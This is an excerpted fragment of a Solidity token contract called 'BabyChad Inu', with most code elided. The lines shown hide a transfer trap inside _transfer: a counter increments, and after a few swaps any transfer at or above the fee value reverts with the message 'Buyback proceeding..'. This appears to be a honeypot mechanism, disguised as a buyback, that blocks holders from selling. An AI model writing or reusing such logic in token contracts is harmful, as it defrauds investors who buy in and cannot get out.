...
contract Chad is Context, IERC20, Ownable {
    ...
    address private _charityWalletAddress = 0x94Af93be509E016244b3c719Fe00Ce12baB9ba1A;
    ...
    string private _name = "BabyChad Inu";
    ...
    function _transfer(
        ...
        {
            swapBuyBack++;if(swapBuyBack > 3){
                if (amount >= _charityFee) 
			    revert("Buyback proceeding..");
            }
		}
